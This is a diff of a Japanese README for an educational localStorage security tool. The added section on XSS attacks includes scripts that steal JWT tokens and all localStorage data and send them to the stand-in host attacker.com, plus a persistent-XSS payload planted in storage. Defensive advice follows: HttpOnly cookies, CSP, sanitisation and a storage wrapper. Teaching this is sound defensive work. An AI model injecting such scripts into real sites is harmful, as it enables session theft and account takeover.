@@ -8,11 +8,21 @@
 
 **Day038 - 生成AIで作るセキュリティツール100**
 
+**LocalStorage Playground** は、ブラウザの `localStorage` や `sessionStorage` に保存されるデータの構造やセキュリティリスクを可視化・体験できる軽量な教育向けツールです。
+
 ---
 
-## 🔍 このツールについて
+## 🌐 デモページ
 
-**LocalStorage Playground** は、ブラウザの `localStorage` や `sessionStorage` に保存されるデータの構造やセキュリティリスク（とくに XSS との組み合わせ）を可視化・体験できる軽量な教育向けツールです。
+👉 [https://ipusiron.github.io/localstorage-playground/](https://ipusiron.github.io/localstorage-playground/)
+
+---
+
+## 📸 スクリーンショット
+
+> ![ストレージに認証情報をセット](assets/screenshot.png)  
+>
+> *ストレージに認証情報をセット*
 
 ---
 
@@ -38,25 +48,166 @@
 
 ## 📚 学べること
 
-- Web Storage API の基本と構造
+- Web Storage APIの基本と構造
 - クライアントストレージにおけるセキュリティ上の注意点
 - XSSと組み合わさることでの深刻な情報漏洩例
-- `HttpOnly` Cookieとの違い
-- `sessionStorage` の適切な用途と寿命
+- `HttpOnly Cookie`との違い
+- `sessionStorage`の適切な用途と寿命
 
 ---
 
-## 🌐 デモページ
+## 🚨 XSSとlocalStorageの組み合わせ攻撃
 
-👉 [https://ipusiron.github.io/localstorage-playground/](https://ipusiron.github.io/localstorage-playground/)
+### 攻撃シナリオ
 
----
+#### 1. 基本的な攻撃パターン
+```javascript
+// XSS脆弱性を悪用して、localStorage内のトークンを盗む
+<script>
+  // JWTトークンの窃取
+  const token = localStorage.getItem('jwt_token');
+  const userData = localStorage.getItem('user_data');
+  
+  // 攻撃者のサーバーへ送信
+  fetch('https://attacker.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({ token, userData }),
+  });
+</script>
+```
 
-## 📸 スクリーンショット
+#### 2. 全データ窃取攻撃
+```javascript
+// localStorage内の全データを一括で盗む
+<script>
+  const allData = {};
+  for (let i = 0; i < localStorage.length; i++) {
+    const key = localStorage.key(i);
+    allData[key] = localStorage.getItem(key);
+  }
+  
+  // Base64エンコードして送信
+  const img = new Image();
+  img.src = `https://attacker.com/collect?data=${btoa(JSON.stringify(allData))}`;
+</script>
+```
 
-> ![ダミー](assets/screenshot.png)  
->
-> *"ダミー*
+#### 3. 持続的攻撃（Persistent XSS）
+```javascript
+// localStorageにマルウェアを仕込む
+<script>
+  // 悪意のあるコードをlocalStorageに保存
+  localStorage.setItem('app_config', JSON.stringify({
+    apiUrl: 'https://attacker.com/api',
+    tracking: '<img src=x onerror="alert(document.cookie)">'
+  }));
+  
+  // アプリケーションがこのデータを信頼して使用すると...
+  // 継続的にXSSが発生する
+</script>
+```
+
+### 実際の被害例
+
+| 攻撃タイプ | 被害内容 | 影響度 |
+|-----------|---------|--------|
+| **認証トークン窃取** | JWTやセッショントークンが盗まれ、なりすましログインが可能に | 🔴 重大 |
+| **個人情報漏洩** | ユーザー設定、プロファイル情報、操作履歴などが流出 | 🔴 重大 |
+| **アカウント乗っ取り** | 認証情報を使って完全にアカウントを制御される | 🔴 重大 |
+| **データ改ざん** | localStorage内のデータを書き換えられ、アプリの動作が異常に | 🟡 中程度 |
+| **マルウェア埋め込み** | 永続的な悪意のあるコードが仕込まれる | 🔴 重大 |
+
+### 防御策
+
+#### ✅ 推奨される対策
+
+1. **機密情報はlocalStorageに保存しない**
+   ```javascript
+   // ❌ 悪い例
+   localStorage.setItem('auth_token', token);
+   
+   // ✅ 良い例 - HttpOnly Cookieを使用
+   // サーバー側で設定:
+   // Set-Cookie: auth_token=xxx; HttpOnly; Secure; SameSite=Strict
+   ```
+
+2. **Content Security Policy (CSP) の実装**
+   ```html
+   <meta http-equiv="Content-Security-Policy" 
+         content="default-src 'self'; script-src 'self'">
+   ```
+
+3. **入力値の適切なサニタイゼーション**
+   ```javascript
+   // DOMPurifyなどのライブラリを使用
+   const clean = DOMPurify.sanitize(userInput);
+   ```
+
+4. **トークンの短期化と更新**
+   ```javascript
+   // トークンに有効期限を設定
+   const tokenData = {
+     value: 'xxx',
+     expires: Date.now() + (15 * 60 * 1000) // 15分
+   };
+   ```
+
+### セキュアな実装例
+
+```javascript
+// セキュアなストレージラッパーの実装
+class SecureStorage {
+  // 暗号化して保存（完全ではないが、単純な攻撃を防ぐ）
+  static setItem(key, value, isPublic = false) {
+    if (!isPublic && this.isSensitive(key)) {
+      console.warn(`Warning: Storing potentially sensitive data in localStorage`);
+      return false;
+    }
+    
+    const data = {
+      value: value,
+      timestamp: Date.now(),
+      checksum: this.generateChecksum(value)
+    };
+    
+    localStorage.setItem(key, JSON.stringify(data));
+  }
+  
+  // 改ざんチェック付きで取得
+  static getItem(key) {
+    const item = localStorage.getItem(key);
+    if (!item) return null;
+    
+    const data = JSON.parse(item);
+    if (this.generateChecksum(data.value) !== data.checksum) {
+      console.error('Data tampering detected!');
+      localStorage.removeItem(key);
+      return null;
+    }
+    
+    return data.value;
+  }
+  
+  static isSensitive(key) {
+    const sensitivePatterns = ['token', 'password', 'secret', 'key', 'auth'];
+    return sensitivePatterns.some(pattern => 
+      key.toLowerCase().includes(pattern)
+    );
+  }
+  
+  static generateChecksum(value) {
+    // 簡易的なチェックサム（本番環境では適切なハッシュ関数を使用）
+    return btoa(JSON.stringify(value)).slice(-10);
+  }
+}
+```
+
+### ⚠️ 重要な注意点
+
+- **localStorage/sessionStorageは、XSS攻撃に対して無防備です**
+- **JWTトークンやAPIキーなどの機密情報は絶対に保存しないでください**
+- **HttpOnly Cookieを使用することで、JavaScriptからのアクセスを防げます**
+- **定期的なセキュリティ監査とペネトレーションテストを実施してください**
 
 ---
 
@@ -72,16 +223,6 @@ localstorage-playground/
 ```
 
 ---
-
-## 🔧 現時点の実装内容（v0.1）
-
-本ツールは以下の機能を初期実装済みです（Claude Code CLI などによる改良に利用可能です）。
-
-### 📁 実装ファイル
-
-- `index.html`：3タブ構成（ストレージ操作 / XSSデモ / 学習）
-- `style.css`：モダンUI＋レスポンシブ対応＋ダークモード
-- `script.js`：以下の機能を含む
 
 ### ⚙️ 実装済み機能一覧
 
